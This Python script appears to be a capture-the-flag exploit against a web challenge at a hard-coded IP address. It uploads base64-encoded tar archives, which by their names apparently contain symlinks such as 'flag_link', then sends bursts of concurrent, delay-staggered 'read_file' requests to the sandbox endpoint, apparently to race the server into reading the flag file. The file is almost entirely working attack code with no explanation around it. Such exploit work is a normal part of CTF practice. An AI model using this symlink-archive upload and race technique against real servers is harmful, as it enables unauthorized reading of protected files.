import asyncio
import aiohttp
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import concurrent.futures
import base64

import urllib.parse


with open('flag_link.tar', 'rb') as f:
    tar_bytes = f.read()
    flag_tar64 = base64.b64encode(tar_bytes).decode('utf-8')
    flag_tar64 = urllib.parse.quote_plus(flag_tar64)

print("http://174.138.16.103:28054/upload?tar="+flag_tar64)
# Method 1: Using asyncio + aiohttp (Recommended for many requests)
async def async_requests_example():
    
    """Send 3 concurrent requests using asyncio and aiohttp"""
    print("=== Method 1: AsyncIO + aiohttp ===")
    urls = []
    for i in range(100):
        urls.append('http://174.138.16.103:28054/sandbox?method=read_file&args=link')
    [urls.append(i) for i in [
        # "http://174.138.16.103:28054/sandbox?method=write_file&args=flag_link&args=skibidi",
        # "http://174.138.16.103:28054/list_users",
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        "http://174.138.16.103:28054/sandbox?method=read_file&args=link&delay=1",
        "http://174.138.16.103:28054/sandbox?method=read_file&args=link&delay=2",
        "http://174.138.16.103:28054/sandbox?method=read_file&args=link&delay=3",
        "http://174.138.16.103:28054/sandbox?method=read_file&args=link&delay=4",
        "http://174.138.16.103:28054/sandbox?method=read_file&args=link&delay=5",
        "http://174.138.16.103:28054/sandbox?method=read_file&args=link&delay=6",
        "http://174.138.16.103:28054/sandbox?method=read_file&args=link&delay=7",

        "http://174.138.16.103:28054/upload?tar="+ flag_tar64,
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        'http://174.138.16.103:28054/sandbox?method=read_file&args=link',
        "http://174.138.16.103:28054/sandbox?method=read_file&args=link&delay=1",
        "http://174.138.16.103:28054/sandbox?method=read_file&args=link&delay=2",
        "http://174.138.16.103:28054/sandbox?method=read_file&args=link&delay=3",
        "http://174.138.16.103:28054/sandbox?method=read_file&args=link&delay=4",
        "http://174.138.16.103:28054/sandbox?method=read_file&args=link&delay=5",
        "http://174.138.16.103:28054/sandbox?method=read_file&args=link&delay=6",
        # "http://174.138.16.103:28054/upload?tar="+ tar64,
    ]]
    
    print(len(urls))
    

        
    
    async def fetch(session, url):
        start_time = time.time()
        try:
            if 'delay' in url:
                delay = int(url.split('delay=')[1])
                # print(f"Delaying request to {url} by {delay}ms")
                await asyncio.sleep(delay/100)
            async with session.get(url) as response:
                data = await response.json()
                end_time = time.time()
                return {
                    'url': url[:50] if len(url) > 50 else url,
                    'status': response.status,
                    'data': str(data)[:100] if len(str(data))>1000 else data,
                    'time': end_time - start_time
                }
        except Exception as e:
            end_time = time.time()
            return {
                'url': url,
                'error': str(e),
                'time': end_time - start_time
            }
    
    start_total = time.time()
    
    async with aiohttp.ClientSession() as session:
        # Send all requests concurrently
        tasks = [fetch(session, url) for url in urls]
        results = await asyncio.gather(*tasks)
    
    end_total = time.time()
    
    print(f"Total time: {end_total - start_total:.2f}s")
    for i, result in enumerate(results, 1):
        print(f"Request {i}: {result}")
        if 'sctf' in str(result):
            print(f"Flag found: {result}" + '\n'*10)
            break
    return results




def upload_users_link():
    with open('users_link.tar', 'rb') as f:
        tar_bytes = f.read()
        tar64 = base64.b64encode(tar_bytes).decode('utf-8')
    url = 'http://174.138.16.103:28054/upload'
    # url = 'http://174.138.16.103:28054/upload?tar=' + tar64
    
    response = requests.get(url, params={'tar': tar64})
    print(f"Upload response: {response.status_code} - {response.text[:100]}")
    
def upload_flag_link():
    with open('flag_link.tar', 'rb') as f:
        tar_bytes = f.read()
        tar64 = base64.b64encode(tar_bytes).decode('utf-8')
    url = 'http://174.138.16.103:28054/upload'
    # url = 'http://174.138.16.103:28054/upload?tar=' + tar64
    
    response = requests.get(url, params={'tar': tar64})
    print(f"Upload response: {response.status_code} - {response.text[:100]}")
    
for i in range(20):
    upload_users_link()
    asyncio.run(async_requests_example())
# upload_flag_link()